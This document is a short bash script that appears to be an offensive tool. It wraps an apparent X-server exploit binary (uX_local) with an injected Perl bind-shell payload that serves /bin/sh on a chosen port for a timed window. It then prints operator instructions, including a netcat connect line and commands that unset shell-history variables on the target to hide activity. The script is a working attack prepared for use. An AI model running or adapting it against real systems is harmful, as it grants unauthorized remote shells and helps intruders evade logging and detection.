#!/bin/bash
VERSION=1.0.0.3


LISTEN_PORT=LISTEN_PORT
VENDOR_STR="\`perl -MIO -e 'if (\$k=fork){\$i=${BURN_TIME};while(\$i--){sleep 1;}kill(9,\$k);exit;}chdir(\"/tmp\");while(\$c=new IO::Socket::INET(LocalPort,${LISTEN_PORT},Reuse,1,Listen)->accept){$~->fdopen(\$c,w);STDIN->fdopen(\$c,r);STDERR->fdopen(\$c,w);system \"/bin/sh\";}'&\`" 

usage ()
{
echo "Usage: ${0}

Uses YS to start remote perl process with a shell listening on a port using:


VENDOR_STR=\"$VENDOR_STR\"

	-b [ length of time to listen DEFAULT = 6000]
        -t [ target IP - for forward tunnel pastable ]
	-p [ remote listen port DEFAULT = 32177 ]
	-x [ port to start mini X server on DEFAULT = 12121 ]

example: ${0} -b 5000 -p 22222 -x 9999

$0 v. $VERSION
"
}


XPORT=0
LISTEN_PORT=0
BURN_TIME=0


while getopts hvb:p:x:t: optvar
	do
	        case "$optvar"
	        in
			t) TARGET_IP=${OPTARG}
			   ;;
			b) BURN_TIME=${OPTARG}
			   ;;
			h|v)
			   usage
			   exit 1
			   ;;
		        p) LISTEN_PORT=${OPTARG}	
			   ;;
			x) XPORT=${OPTARG}		
			   ;;
		        *) echo "invalid option"
			   usage
			   exit 1
			   ;;
		esac
	done

[ "$TARGET_IP" ] || TARGET_IP=USE_-t_OPTION_FOR_TARGET_IP
	
if [ ${BURN_TIME} = 0 ]
then
	BURN_TIME=6000
fi

if [ ${XPORT} = 0 ]
then
	XPORT=12121
fi

if [ ${LISTEN_PORT} = 0 ]
then
	LISTEN_PORT=32177
fi


echo
echo "########################################"
echo "Listen port = ${LISTEN_PORT}"
echo "Burn time= ${BURN_TIME}"
echo "Starting mini X server on port ${XPORT}"
echo "########################################"
echo "# TUNNEL PASTABLES:"
echo " -tunnel"
echo " r ${XPORT}"
echo " l ${LISTEN_PORT} $TARGET_IP"
echo
echo -e "# NETCAT PASTABLES ONCE/ASSUMING THIS WORKS"
echo -e "# (do not forget scripted window)\n\n"
TEST=`scriptcheck`
[ "$TEST" ] || ( echo -e "CANNOT PROCEED WITHOUT SCRIPTED WINDOW\a" ; beeps 1  )
[ "$TEST" ] || exit 1
echo -e "nc -vv 127.0.0.1 ${LISTEN_PORT}\n\n"
echo "# TARGET SHELL PASTABLES"
echo "unset HISTFILE"
echo "unset HISTFILESIZE"
echo "unset HISTSIZE"
echo "w"
echo "uname -a"



VENDOR_STR="\`perl -MIO -e 'use IO::Socket::INET;if (\$k=fork){\$i=${BURN_TIME};while(\$i--){sleep 1;}kill(9,\$k);exit;}chdir(\"/tmp\");while(\$c=new IO::Socket::INET(LocalPort,${LISTEN_PORT},Reuse,1,Listen)->accept){$~->fdopen(\$c,w);STDIN->fdopen(\$c,r);STDERR->fdopen(\$c,w);system \"/bin/sh\";}'&\`" 


./uX_local -e "${VENDOR_STR}" -v -p ${XPORT} -c xxx
